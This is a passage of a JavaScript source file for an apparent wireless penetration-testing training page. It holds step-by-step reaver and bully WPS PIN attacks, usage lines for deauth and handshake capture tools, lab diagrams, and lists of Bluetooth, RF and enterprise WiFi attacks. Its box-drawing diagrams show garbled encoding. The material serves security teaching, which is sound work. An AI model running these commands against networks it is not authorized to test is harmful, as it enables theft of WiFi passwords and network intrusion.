          "sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -K 1 -vv",
          "",
          "# Example:",
          "sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv",
          "",
          "# -K 1 = Pixie Dust attack",
          "# -vv = verbose output",
          "",
          "# Alternative with bully:",
          "sudo bully -b [BSSID] -c [CHANNEL] -d -v 3 wlan0mon",
        ],
        verification: "PIN and PSK displayed (if vulnerable)",
        notes: "Pixie Dust only works on ~30% of routers. Takes seconds if vulnerable.",
      },
      {
        step: 3,
        title: "If Pixie Dust Fails - Standard Bruteforce",
        commands: [
          "# Standard WPS bruteforce:",
          "sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -vv",
          "",
          "# With delay to avoid lockout:",
          "sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -d 2 -vv",
          "",
          "# Resume interrupted session:",
          "sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] --session=session.wpc -vv",
          "",
          "# Note: Full bruteforce = 11,000 attempts",
          "# At 1 attempt/3sec = ~9 hours max",
        ],
        verification: "Progress shown, eventually PIN recovered",
        notes: "Many APs lock after 3-10 failed attempts. May need to wait hours between sessions.",
      },
      {
        step: 4,
        title: "Use Recovered PIN to Get PSK",
        commands: [
          "# If you have PIN but need PSK:",
          "sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -p [PIN] -vv",
          "",
          "# Example:",
          "sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -p 12345670 -vv",
          "",
          "# PSK (WiFi password) will be displayed",
        ],
        verification: "WPA PSK displayed along with PIN",
        notes: "WPS PIN is static on many routers - changing WiFi password doesn't change PIN!",
      },
    ],
    successCriteria: [
      "Identified WPS-enabled target network",
      "Successfully recovered WPS PIN",
      "Obtained WPA/WPA2 password via WPS",
    ],
    troubleshooting: [
      { problem: "Pixie Dust fails (no results)", solution: "Router not vulnerable to Pixie Dust. Try standard bruteforce or different target." },
      { problem: "WPS locked (Lck = Yes)", solution: "Wait 5-60 minutes for lockout to clear. Decrease request rate." },
      { problem: "Receive rate limited", solution: "Use -d flag for delay between attempts" },
    ],
  },
];

// Build your own practice network diagrams
const practiceNetworkDesigns = [
  {
    name: "Basic Home Lab",
    difficulty: "Beginner",
    cost: "$50-100",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  BASIC HOME LAB                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                        â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”‚
â”‚     â”‚ Kali Linux  â”‚          â”‚ Target      â”‚          â”‚
â”‚     â”‚ (VM or bare)â”‚          â”‚ Router      â”‚          â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚
â”‚           â”‚                        â”‚                   â”‚
â”‚           â”‚ USB                    â”‚                   â”‚
â”‚           â†“                        â†“                   â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”‚
â”‚     â”‚ Alfa Adapterâ”‚  WiFi    â”‚ Test Device â”‚          â”‚
â”‚     â”‚ (wlan0mon)  â”‚ â†â”€â”€â”€â”€â”€â†’  â”‚ (any old    â”‚          â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚  laptop)    â”‚          â”‚
â”‚                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚
â”‚                                                        â”‚
â”‚  Equipment:                                            â”‚
â”‚  â€¢ Old laptop or VM for Kali                          â”‚
â”‚  â€¢ Alfa AWUS036ACH (~$40)                             â”‚
â”‚  â€¢ Any old WiFi router (~$10 used)                    â”‚
â”‚  â€¢ Old laptop/phone for client                        â”‚
â”‚                                                        â”‚
â”‚  Configs to Test:                                      â”‚
â”‚  â–¡ WEP (if router supports)                           â”‚
â”‚  â–¡ WPA2-PSK                                           â”‚
â”‚  â–¡ WPS enabled                                        â”‚
â”‚  â–¡ Hidden SSID                                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
    learningGoals: ["Basic handshake capture", "WPS attacks", "Monitor mode operation"],
  },
  {
    name: "Intermediate Multi-Network Lab",
    difficulty: "Intermediate",
    cost: "$150-300",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              INTERMEDIATE MULTI-NETWORK LAB                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                    ATTACKER SETUP                     â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”‚   â”‚
â”‚  â”‚  â”‚ Kali    â”‚  â”‚ Alfa #1 â”‚  â”‚ Alfa #2 â”‚              â”‚   â”‚
â”‚  â”‚  â”‚ Laptop  â”‚â”€â”€â”‚ 2.4GHz  â”‚  â”‚ 5GHz    â”‚              â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                          â”‚                                   â”‚
â”‚            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”‚
â”‚            â†“             â†“             â†“                    â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚
â”‚     â”‚ Router 1 â”‚  â”‚ Router 2 â”‚  â”‚ Router 3 â”‚               â”‚
â”‚     â”‚ WPA2-PSK â”‚  â”‚ WPS      â”‚  â”‚ Hidden   â”‚               â”‚
â”‚     â”‚ SSID:Lab1â”‚  â”‚ SSID:Lab2â”‚  â”‚ SSID:Lab3â”‚               â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚
â”‚          â”‚             â”‚             â”‚                      â”‚
â”‚          â†“             â†“             â†“                      â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚
â”‚     â”‚ Client 1 â”‚  â”‚ Client 2 â”‚  â”‚ Client 3 â”‚               â”‚
â”‚     â”‚ (laptop) â”‚  â”‚ (phone)  â”‚  â”‚ (IoT)    â”‚               â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚
â”‚                                                              â”‚
â”‚  Equipment:                                                  â”‚
â”‚  â€¢ 3x routers (different vendors) (~$30-50 used)            â”‚
â”‚  â€¢ 2x Alfa adapters (2.4 + 5GHz)                            â”‚
â”‚  â€¢ Various client devices                                    â”‚
â”‚  â€¢ Network switch for management                             â”‚
â”‚                                                              â”‚
â”‚  Scenarios:                                                  â”‚
â”‚  â–¡ Multi-network recon                                       â”‚
â”‚  â–¡ Evil twin (with 2 adapters)                              â”‚
â”‚  â–¡ Hidden network discovery                                  â”‚
â”‚  â–¡ Channel congestion analysis                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
    learningGoals: ["Multi-target assessment", "Evil twin attacks", "Hidden network discovery", "5GHz testing"],
  },
  {
    name: "Enterprise Simulation Lab",
    difficulty: "Advanced",
    cost: "$500-1000",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   ENTERPRISE SIMULATION LAB                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                    RADIUS SERVER                        â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚   â”‚
â”‚  â”‚  â”‚  FreeRADIUS on Ubuntu/Debian                      â”‚  â”‚   â”‚
â”‚  â”‚  â”‚  - EAP-PEAP/MSCHAPv2 configured                  â”‚  â”‚   â”‚
â”‚  â”‚  â”‚  - Test user accounts                             â”‚  â”‚   â”‚
â”‚  â”‚  â”‚  - Certificates for EAP-TLS testing              â”‚  â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                              â”‚                                 â”‚
â”‚                              â”‚ RADIUS                          â”‚
â”‚                              â†“                                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                  ENTERPRISE AP                          â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚   â”‚
â”‚  â”‚  â”‚ Router/AP with   â”‚  â”‚ Ubiquiti or      â”‚            â”‚   â”‚
â”‚  â”‚  â”‚ WPA2-Enterprise  â”‚  â”‚ similar pro AP   â”‚            â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚            â”‚                              â”‚                    â”‚
â”‚            â”‚ Corp Network                 â”‚ Guest              â”‚
â”‚            â†“                              â†“                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”           â”‚
â”‚  â”‚ Domain-Joinedâ”‚              â”‚ Guest Network     â”‚           â”‚
â”‚  â”‚ Test Laptop  â”‚              â”‚ (Captive Portal) â”‚           â”‚
â”‚  â”‚ - AD creds   â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜           â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                              â”‚
â”‚                                                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                    ATTACKER                             â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚   â”‚
â”‚  â”‚  â”‚  Kali Linux + hostapd-wpe                         â”‚  â”‚   â”‚
â”‚  â”‚  â”‚  Multiple adapters for simultaneous attacks       â”‚  â”‚   â”‚
â”‚  â”‚  â”‚  Fake RADIUS server capabilities                  â”‚  â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                â”‚
â”‚  Advanced Scenarios:                                           â”‚
â”‚  â–¡ Enterprise credential capture (hostapd-wpe)                â”‚
â”‚  â–¡ Certificate-based auth testing                              â”‚
â”‚  â–¡ Captive portal bypass                                       â”‚
â”‚  â–¡ VLAN hopping via wireless                                   â”‚
â”‚  â–¡ Guest to corporate pivot                                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
    learningGoals: ["Enterprise WiFi attacks", "RADIUS exploitation", "Certificate validation testing", "Network segmentation bypass"],
  },
];

const tools = [
  {
    category: "Wireless Adapters",
    description: "Hardware with chipsets that support monitor mode and packet injection",
    items: [
      { name: "Alfa AWUS036ACH", description: "Dual-band AC1200, Realtek RTL8812AU, excellent for modern networks", type: "Hardware", chipset: "RTL8812AU", bands: "2.4/5 GHz" },
      { name: "Alfa AWUS036ACHM", description: "Mediatek MT7612U, better driver support on newer kernels", type: "Hardware", chipset: "MT7612U", bands: "2.4/5 GHz" },
      { name: "Alfa AWUS036ACM", description: "AC1200 with Mediatek chipset, excellent range with antennas", type: "Hardware", chipset: "MT7612U", bands: "2.4/5 GHz" },
      { name: "TP-Link TL-WN722N v1", description: "Budget classic - ONLY version 1 works (Atheros AR9271)", type: "Hardware", chipset: "AR9271", bands: "2.4 GHz" },
      { name: "Panda PAU09", description: "Dual-band with Ralink chipset, good Linux support", type: "Hardware", chipset: "RT5572", bands: "2.4/5 GHz" },
      { name: "Alfa AWUS1900", description: "AC1900 4x4 MIMO, maximum range and throughput", type: "Hardware", chipset: "RTL8814AU", bands: "2.4/5 GHz" },
    ],
  },
  {
    category: "Scanning & Discovery",
    description: "Tools for finding and mapping wireless networks",
    items: [
      { name: "Aircrack-ng Suite", description: "The gold standard - includes airmon-ng, airodump-ng, aireplay-ng, aircrack-ng", type: "Software", platform: "Linux/Windows" },
      { name: "Kismet", description: "Wireless detector, sniffer, WIDS - supports WiFi, Bluetooth, SDR", type: "Software", platform: "Linux" },
      { name: "Wireshark", description: "Deep packet analysis with 802.11 dissectors and filters", type: "Software", platform: "Cross-platform" },
      { name: "WiFite2", description: "Automated wireless auditing - runs multiple attacks automatically", type: "Software", platform: "Linux" },
      { name: "LinSSID", description: "Graphical WiFi scanner showing signal strength over time", type: "Software", platform: "Linux" },
      { name: "inSSIDer", description: "Professional site survey tool with spectrum analysis", type: "Software", platform: "Windows" },
    ],
  },
  {
    category: "Attack Tools",
    description: "Core tools for executing wireless attacks",
    items: [
      { name: "airmon-ng", description: "Enable/disable monitor mode on wireless interfaces", type: "Software", usage: "airmon-ng start wlan0" },
      { name: "airodump-ng", description: "Capture 802.11 frames, display nearby networks and clients", type: "Software", usage: "airodump-ng -c 6 wlan0mon" },
      { name: "aireplay-ng", description: "Inject packets: deauth, fake auth, ARP replay, chopchop", type: "Software", usage: "aireplay-ng -0 5 -a BSSID wlan0mon" },
      { name: "aircrack-ng", description: "WEP/WPA key cracking engine with dictionary support", type: "Software", usage: "aircrack-ng -w wordlist.txt capture.cap" },
      { name: "hcxdumptool", description: "Capture PMKID and full EAPOL handshakes efficiently", type: "Software", usage: "hcxdumptool -i wlan0mon -o dump.pcapng" },
      { name: "hcxpcapngtool", description: "Convert captures to hashcat/JtR format", type: "Software", usage: "hcxpcapngtool -o hash.22000 dump.pcapng" },
    ],
  },
  {
    category: "Evil Twin & MITM",
    description: "Create rogue access points and intercept traffic",
    items: [
      { name: "hostapd", description: "Create software access points with full configuration control", type: "Software", platform: "Linux" },
      { name: "hostapd-wpe", description: "Modified hostapd for WPA-Enterprise credential capture", type: "Software", platform: "Linux" },
      { name: "Fluxion", description: "Automated evil twin + captive portal for WPA key phishing", type: "Software", platform: "Linux" },
      { name: "WiFi-Pumpkin3", description: "Full MITM framework with plugins for credential capture", type: "Software", platform: "Linux" },
      { name: "Bettercap", description: "Swiss army knife for network attacks, including WiFi", type: "Software", platform: "Cross-platform" },
      { name: "EAPHammer", description: "Targeted evil twin attacks against WPA-Enterprise", type: "Software", platform: "Linux" },
    ],
  },
  {
    category: "WPS & Specialized",
    description: "Tools for WPS attacks and specialized scenarios",
    items: [
      { name: "Reaver", description: "WPS PIN bruteforce with Pixie Dust support (-K flag)", type: "Software", usage: "reaver -i wlan0mon -b BSSID -K 1" },
      { name: "Bully", description: "Alternative WPS bruteforce, sometimes works when Reaver doesn't", type: "Software", usage: "bully -b BSSID -c 6 wlan0mon" },
      { name: "PixieWPS", description: "Standalone Pixie Dust implementation for offline WPS cracking", type: "Software", platform: "Linux" },
      { name: "Wash", description: "Scan for WPS-enabled access points and check lock status", type: "Software", usage: "wash -i wlan0mon" },
      { name: "mdk4", description: "Wireless attack toolkit: beacon flood, deauth, WDS confusion", type: "Software", platform: "Linux" },
      { name: "Airgeddon", description: "Multi-use bash script combining many wireless tools", type: "Software", platform: "Linux" },
    ],
  },
  {
    category: "Password Cracking",
    description: "Offline cracking of captured handshakes",
    items: [
      { name: "Hashcat", description: "GPU-accelerated cracking - mode 22000 for WPA, 22001 for PMKID", type: "Software", platform: "Cross-platform" },
      { name: "John the Ripper", description: "CPU cracking with rules, good for slow hashes", type: "Software", platform: "Cross-platform" },
      { name: "coWPAtty", description: "WPA-PSK dictionary attack with rainbow table support", type: "Software", platform: "Linux" },
      { name: "Pyrit", description: "WPA cracking with GPU and precomputation database", type: "Software", platform: "Linux" },
    ],
  },
];

const bluetoothAttacks = [
  { name: "BlueBorne", description: "Remote code execution via Bluetooth stack vulnerabilities (CVE-2017-0781)", severity: "Critical", year: 2017 },
  { name: "Bluejacking", description: "Sending unsolicited messages via OBEX Push", severity: "Low", year: 2003 },
  { name: "Bluesnarfing", description: "Unauthorized access to contacts, calendars, messages", severity: "High", year: 2003 },
  { name: "BlueSmacking", description: "Bluetooth L2CAP ping flood causing DoS", severity: "Medium", year: 2003 },
  { name: "KNOB Attack", description: "Key Negotiation of Bluetooth - force 1-byte entropy key", severity: "High", year: 2019 },
  { name: "BIAS Attack", description: "Bluetooth Impersonation AttackS - impersonate paired devices", severity: "High", year: 2020 },
  { name: "BlueFrag", description: "Android Bluetooth RCE via malformed L2CAP packets", severity: "Critical", year: 2020 },
  { name: "BrakTooth", description: "Family of 16 BT Classic vulnerabilities affecting billions of devices", severity: "Critical", year: 2021 },
  { name: "BLE Sniffing", description: "Capture Bluetooth Low Energy advertising and connections", severity: "Medium", year: "Ongoing" },
  { name: "GATT Attacks", description: "Exploit misconfigured BLE services and characteristics", severity: "Variable", year: "Ongoing" },
];

const bluetoothTools = [
  { name: "hcitool", description: "Configure Bluetooth connections and devices", platform: "Linux" },
  { name: "Ubertooth One", description: "Open source 2.4GHz wireless platform for BT sniffing", platform: "Hardware" },
  { name: "Bettercap", description: "BLE enumeration and MITM capabilities", platform: "Cross-platform" },
  { name: "Bluez", description: "Official Linux Bluetooth stack with testing tools", platform: "Linux" },
  { name: "BTLE-Sniffer", description: "Passive BLE advertisement capture", platform: "Linux" },
  { name: "GATTacker", description: "MITM framework for BLE devices", platform: "Node.js" },
  { name: "Crackle", description: "Crack BLE encryption from captured traffic", platform: "Linux" },
];

const rfProtocols = [
  { protocol: "Zigbee", frequency: "2.4 GHz", use: "IoT, Smart Home", security: "AES-128", vulnerabilities: "Key extraction, replay attacks, default keys" },
  { protocol: "Z-Wave", frequency: "908 MHz (US)", use: "Home Automation", security: "AES-128", vulnerabilities: "S0 downgrade, network key interception" },
  { protocol: "LoRa/LoRaWAN", frequency: "Various (ISM bands)", use: "Long-range IoT, sensors", security: "AES-128", vulnerabilities: "Replay attacks, join procedure exploitation" },
  { protocol: "NFC", frequency: "13.56 MHz", use: "Payments, Access Cards", security: "Variable", vulnerabilities: "Relay attacks, weak MIFARE Classic crypto" },
  { protocol: "RFID LF", frequency: "125 kHz", use: "Access Cards, Tracking", security: "Often none", vulnerabilities: "Easy cloning, no encryption on many cards" },
  { protocol: "RFID HF", frequency: "13.56 MHz", use: "Passports, Transit", security: "Variable", vulnerabilities: "Depends on implementation" },
  { protocol: "Sub-GHz", frequency: "315/433/868 MHz", use: "Car fobs, Remotes", security: "Often none", vulnerabilities: "Replay attacks, rolling code weaknesses" },
  { protocol: "Thread", frequency: "2.4 GHz", use: "Smart Home (Matter)", security: "DTLS + AES-128", vulnerabilities: "Relatively new, few known attacks" },
];

const enterpriseTopics = [
  { topic: "802.1X Authentication", description: "Port-based network access control - the foundation of enterprise wireless", icon: <LockIcon /> },
  { topic: "RADIUS Server", description: "Remote Authentication Dial-In User Service - centralized AAA", icon: <StorageIcon /> },
  { topic: "EAP Methods", description: "EAP-TLS (certs both sides), EAP-TTLS, PEAP (server cert only), EAP-FAST", icon: <SecurityIcon /> },
  { topic: "Certificate Management", description: "PKI infrastructure, CA hierarchy, client cert distribution", icon: <LockIcon /> },
  { topic: "Network Segmentation", description: "Dynamic VLAN assignment based on user/device attributes", icon: <NetworkCheckIcon /> },
  { topic: "Wireless IDS/IPS", description: "Detect rogue APs, deauth floods, evil twins in real-time", icon: <ShieldIcon /> },
  { topic: "NAC Integration", description: "802.1X + posture assessment for endpoint compliance", icon: <DevicesIcon /> },
  { topic: "MDM Integration", description: "Mobile Device Management for certificate provisioning", icon: <PhoneAndroidIcon /> },
];

const eapMethods = [
  { method: "EAP-TLS", security: "Highest", description: "Mutual certificate authentication - client and server certs", deployment: "Complex", vulnerability: "Certificate management overhead" },
  { method: "EAP-TTLS", security: "High", description: "Server cert creates tunnel, inner auth (PAP, CHAP, MSCHAPv2)", deployment: "Medium", vulnerability: "Inner credentials can be captured" },
  { method: "PEAP", security: "High", description: "Similar to TTLS, Microsoft-backed, MSCHAPv2 common inside", deployment: "Easy", vulnerability: "MSCHAPv2 offline cracking possible" },
  { method: "EAP-FAST", security: "High", description: "Cisco proprietary, uses Protected Access Credentials", deployment: "Medium", vulnerability: "PAC provisioning can be exploited" },
  { method: "LEAP", security: "Broken", description: "Cisco legacy - MS-CHAPv1 based, easily cracked", deployment: "Easy", vulnerability: "Offline dictionary attack in seconds" },
];

const enterpriseAttacks = [
  { attack: "Evil Twin + hostapd-wpe", description: "Impersonate corporate SSID to capture enterprise credentials via fake RADIUS", difficulty: "Medium", impact: "High" },
  { attack: "EAP Downgrade", description: "Force client to use weaker EAP method by advertising different capabilities", difficulty: "Medium", impact: "High" },
  { attack: "Certificate Impersonation", description: "Many clients skip certificate validation - present any cert", difficulty: "Easy", impact: "High" },
  { attack: "MSCHAPv2 Offline Cracking", description: "Captured challenge/response cracked with dictionary attack", difficulty: "Easy", impact: "High" },
  { attack: "RADIUS Impersonation", description: "If shared secret weak, impersonate RADIUS to approve any auth", difficulty: "Hard", impact: "Critical" },
  { attack: "Guest Network Pivoting", description: "Escape guest VLAN isolation via misconfigurations", difficulty: "Medium", impact: "Medium" },
  { attack: "Rogue AP Detection Bypass", description: "Evade WIDS by mimicking legitimate AP characteristics", difficulty: "Hard", impact: "Medium" },
  { attack: "GTC Password Capture", description: "If EAP-GTC used, passwords transmitted in cleartext in tunnel", difficulty: "Easy", impact: "Critical" },
];

const defenseStrategies = [
